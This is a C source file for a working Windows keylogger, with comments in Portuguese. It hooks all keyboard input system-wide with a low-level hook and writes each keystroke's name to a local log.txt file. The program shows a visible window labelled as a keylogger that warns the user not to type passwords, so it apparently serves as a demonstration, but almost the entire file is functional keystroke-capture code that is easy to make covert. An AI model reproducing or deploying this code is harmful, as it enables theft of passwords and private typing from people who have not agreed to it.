#include <Windows.h>
#include <CommCtrl.h>

HWND _handleWindow;
HANDLE arquivo;

void vkcodeTranslationTable(DWORD vkcode, LPSTR resultado){
	char buf[100];
	LPSTR ret = buf;
	switch(vkcode){
		case VK_LBUTTON:
			ret = "Left mouse button";
			break;
		case VK_RBUTTON:
			ret = "Right mouse button";
			break;
		case VK_CANCEL:
			ret = "Control-break processing";
			break;
		case VK_MBUTTON:
			ret = "Middle mouse button (three-button mouse)";
			break;
		case VK_XBUTTON1:
			ret = "X1 mouse button";
			break;
		case VK_XBUTTON2:
			ret = "X2 mouse button";
			break;
		case VK_BACK:
			ret = "BACKSPACE key";
			break;
		case VK_TAB:
			ret = "TAB key";
			break;
		case VK_CLEAR:
			ret = "CLEAR key";
			break;
		case VK_SHIFT:
			ret = "SHIFT key";
			break;
		case VK_CONTROL:
			ret = "CONTROL key";
			break;
		case VK_PAUSE:
			ret = "PAUSE key";
			break;
		case VK_CAPITAL:
			ret = "CAPS LOCK key";
			break;
		case VK_ESCAPE:
			ret = "ESC key";
			break;
		case VK_SPACE:
			ret = "SPACEBAR key";
			break;
		case VK_PRIOR:
			ret = "PAGE UP key";
			break;
		case VK_NEXT:
			ret = "PAGE DOWN key";
			break;
		case VK_END:
			ret = "END key";
			break;
		case VK_HOME:
			ret = "HOME key";
			break;
		case VK_LEFT:
			ret = "LEFT ARROW key";
			break;
		case VK_UP:
			ret = "UP ARROW key";
			break;
		case VK_RIGHT:
			ret = "RIGHT ARROW key";
			break;
		case VK_DOWN:
			ret = "DOWN ARROW key";
			break;
		case VK_SNAPSHOT:
			ret = "PRINTSCREEN key";
			break;
		case VK_INSERT:
			ret = "INSERT key";
			break;
		case VK_DELETE:
			ret = "DELETE key";
			break;
		case 0x30:
			ret = "0 key";
			break;
		case 0x31:
			ret = "1 key";
			break;
		case 0x32:
			ret = "2 key";
			break;
		case 0x33:
			ret = "3 key";
			break;
		case 0x34:
			ret = "4 key";
			break;
		case 0x35:
			ret = "5 key";
			break;
		case 0x36:
			ret = "6 key";
			break;
		case 0x37:
			ret = "7 key";
			break;
		case 0x38:
			ret = "8 key";
			break;
		case 0x39:
			ret = "9 key";
			break;
		case 0x41:
			ret = "A key";
			break;
		case 0x42:
			ret = "B key";
			break;
		case 0x43:
			ret = "C key";
			break;
		case 0x44:
			ret = "D key";
			break;
		case 0x45:
			ret = "E key";
			break;
		case 0x46:
			ret = "F key";
			break;
		case 0x47:
			ret = "G key";
			break;
		case 0x48:
			ret = "H key";
			break;
		case 0x49:
			ret = "I key";
			break;
		case 0x4A:
			ret = "J key";
			break;
		case 0x4B:
			ret = "K key";
			break;
		case 0x4C:
			ret = "L key";
			break;
		case 0x4D:
			ret = "M key";
			break;
		case 0x4E:
			ret = "N key";
			break;
		case 0x4F:
			ret = "O key";
			break;
		case 0x50:
			ret = "P key";
			break;
		case 0x51:
			ret = "Q key";
			break;
		case 0x52:
			ret = "R key";
			break;
		case 0x53:
			ret = "S key";
			break;
		case 0x54:
			ret = "T key";
			break;
		case 0x55:
			ret = "U key";
			break;
		case 0x56:
			ret = "V key";
			break;
		case 0x57:
			ret = "W key";
			break;
		case 0x58:
			ret = "X key";
			break;
		case 0x59:
			ret = "Y key";
			break;
		case 0x5A:
			ret = "Z key";
			break;
		case VK_LWIN:
			ret = "Left Windows key";
			break;
		case VK_RWIN:
			ret = "Right Windows key";
			break;
		case VK_APPS:
			ret = "Applications key";
			break;
		case VK_NUMPAD0:
			ret = "Numeric pad 0 key";
			break;
		case VK_NUMPAD1:
			ret = "Numeric pad 1 key";
			break;
		case VK_NUMPAD2:
			ret = "Numeric pad 2 key";
			break;
		case VK_NUMPAD3:
			ret = "Numeric pad 3 key";
			break;
		case VK_NUMPAD4:
			ret = "Numeric pad 4 key";
			break;
		case VK_NUMPAD5:
			ret = "Numeric pad 5 key";
			break;
		case VK_NUMPAD6:
			ret = "Numeric pad 6 key";
			break;
		case VK_NUMPAD7:
			ret = "Numeric pad 7 key";
			break;
		case VK_NUMPAD8:
			ret = "Numeric pad 8 key";
			break;
		case VK_NUMPAD9:
			ret = "Numeric pad 9 key";
			break;
		case VK_MULTIPLY:
			ret = "Multiply key";
			break;
		case VK_ADD:
			ret = "Add key";
			break;
		case VK_SEPARATOR:
			ret = "Separator key";
			break;
		case VK_SUBTRACT:
			ret = "Subtract key";
			break;
		case VK_DECIMAL:
			ret = "Decimal key";
			break;
		case VK_DIVIDE:
			ret = "DIvide key";
			break;
		case VK_F1:
			ret = "F1 key";
			break;
		case VK_F2:
			ret = "F2 key";
			break;
		case VK_F3:
			ret = "F3 key";
			break;
		case VK_F4:
			ret = "F4 key";
			break;
		case VK_F5:
			ret = "F5 key";
			break;
		case VK_F6:
			ret = "F6 key";
			break;
		case VK_F7:
			ret = "F7 key";
			break;
		case VK_F8:
			ret = "F8 key";
			break;
		case VK_F9:
			ret = "F9 key";
			break;
		case VK_F10:
			ret = "F10 key";
			break;
		case VK_F11:
			ret = "F11 key";
			break;
		case VK_F12:
			ret = "F12 key";
			break;
		case VK_F13:
			ret = "F13 key";
			break;
		case VK_F14:
			ret = "F14 key";
			break;
		case VK_F15:
			ret = "F15 key";
			break;
		case VK_F16:
			ret = "F16 key";
			break;
		case VK_F17:
			ret = "F17 key";
			break;
		case VK_F18:
			ret = "F18 key";
			break;
		case VK_F19:
			ret = "F19 key";
			break;
		case VK_F20:
			ret = "F20 key";
			break;
		case VK_F21:
			ret = "F21 key";
			break;
		case VK_F22:
			ret = "F22 key";
			break;
		case VK_F23:
			ret = "F23 key";
			break;
		case VK_F24:
			ret = "F24 key";
			break;
		case VK_NUMLOCK:
			ret = "NUMLOCK key";
			break;
		case VK_SCROLL:
			ret = "SCROLL LOCK key";
			break;
		case VK_LSHIFT:
			ret = "Left SHIFT key";
			break;
		case VK_RSHIFT:
			ret = "Right SHIFT key";
			break;
		case VK_LCONTROL:
			ret = "Left CONTROL key";
			break;
		case VK_RCONTROL:
			ret = "Right CONTROL key";
			break;
		case VK_LMENU:
			ret = "Left MENU key";
			break;
		case VK_RMENU:
			ret = "Right MENU key";
			break;
		case VK_OEM_1:
			ret = "BRZ Ç key";
			break;
		case VK_OEM_PLUS:
			ret = "BRZ +/= key";
			break;
		case VK_OEM_2: 
			ret = "BRZ :/; key";
			break;
		case VK_RETURN:
			ret = "ENTER key";
			break;
		default:
			//guarda o vkcode em hexa
			LPSTR vkcodeString = (LPSTR)malloc(sizeof(CHAR)*100); //new CHAR[100];
			itoa(vkcode, vkcodeString, 16);
			//mensagem descritiva do erro
			LPSTR msg = (LPSTR)malloc(sizeof(CHAR) * 100); //new CHAR[100]; 
			strcpy(msg, "Tecla não mapeada, 0x");

			lstrcat(msg, vkcodeString);
			strcpy(ret, msg);

			free(vkcodeString);
			free(msg);
			break;
	}

	strcpy(resultado, ret);

	return;
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam){

	if(nCode >= 0){
		LPKBDLLHOOKSTRUCT evento = (LPKBDLLHOOKSTRUCT)lParam;
		DWORD bytesEscritos = 0;
		LPSTR nomeEvento, teclaEvento = NULL;
		switch(wParam){
			case WM_KEYDOWN:
				nomeEvento = "WM_KEYDOWN";
				break;
			case WM_KEYUP:
				nomeEvento = "WM_KEYUP";
				break;
			case WM_SYSKEYDOWN:
				nomeEvento = "WM_SYSKEYDOWN";
				break;
			case WM_SYSKEYUP:
				nomeEvento = "WM_SYSKEYDOWN";
				break;
		}

		teclaEvento = (LPSTR)malloc(sizeof(CHAR) * 100);

		vkcodeTranslationTable(evento->vkCode, teclaEvento);
		LPSTR formato = "Evento=%s, tecla=%s\r\n";
		LPSTR escrever = (LPSTR)malloc(sizeof(CHAR) * 100); 
		memset(escrever, 0, 100);
		int tam = wsprintf(escrever,formato, nomeEvento, teclaEvento);

		BOOL res = WriteFile(arquivo, escrever, tam, &bytesEscritos, NULL);

		free(teclaEvento);
		free(escrever);

		//sai quando pressionado Q
		/*if(evento->vkCode == 65){
			PostMessage(_handleWindow, WM_CLOSE, 0 , 0);
		}*/

	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK WindowProc(HWND   hwnd, UINT   uMsg, WPARAM wParam, LPARAM lParam){
	switch (uMsg) 
    {  
        case WM_DESTROY: 
            // limpar objetos de dados especificos da janela 
			PostQuitMessage(0);
            return 0; 

	    // 
        // processar outras mensagens. 
        // 
 
        default: 
            return DefWindowProc(hwnd, uMsg, wParam, lParam); 
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	//abre arquivo de log
	arquivo = CreateFile("log.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, NULL);
	HWND _label = NULL;

	//cria a estrutura com a classe da mainwindow
	WNDCLASSEX _wndcls;
	_wndcls.cbSize = sizeof(_wndcls);
	_wndcls.style = CS_HREDRAW | CS_VREDRAW;   
	_wndcls.lpfnWndProc = WindowProc;
	_wndcls.cbClsExtra = 0;
	_wndcls.cbWndExtra = 0;
	_wndcls.hInstance = hInstance;
	_wndcls.hIcon = NULL;
	_wndcls.hCursor = NULL;
	_wndcls.hbrBackground = (HBRUSH)COLOR_WINDOW;
	_wndcls.lpszMenuName = NULL;
	_wndcls.lpszClassName = "teste";
	_wndcls.hIconSm = NULL;

	//registra a classe para usar no CreateWindowEx
	ATOM classe = RegisterClassEx(&_wndcls);

	//cria a janela
     _handleWindow = CreateWindowEx(0, "teste", "KEYLOGGER!", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 
		CW_USEDEFAULT, 650, 100, NULL, NULL, hInstance, NULL);

	 //inicializa os common controls
	INITCOMMONCONTROLSEX iccstr;
	iccstr.dwSize = sizeof(INITCOMMONCONTROLSEX);
	iccstr.dwICC = ICC_STANDARD_CLASSES;
	InitCommonControlsEx(&iccstr);

	_label = CreateWindowEx(0, WC_STATIC, "Este programa é um keylogger. Não digite senhas enquanto ele estiver aberto.",
		SS_CENTER | WS_CHILD | WS_VISIBLE, 0, 
		0, 600, 50, _handleWindow, NULL, hInstance, NULL);

	HHOOK _handleHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, NULL);

	//exibe a janela
	BOOL erro = ShowWindow(_handleWindow, nCmdShow);
	erro = UpdateWindow(_handleWindow);
	
	erro = ShowWindow(_label, nCmdShow);
	erro = UpdateWindow(_label);

	BOOL bRet;
	MSG msg;
	while( (bRet = GetMessage(&msg, NULL, 0, 0 )) != 0)
	{ 
		if (bRet == -1)
		{
			//tratar erro e sair, talvez 
		}
		else
		{
			TranslateMessage(&msg); 
			DispatchMessage(&msg); 
		}
	}

	UnhookWindowsHookEx(_handleHook);
	//desregistra a classe
	UnregisterClass("teste", hInstance);
	CloseHandle(arquivo);
	return 0;
}
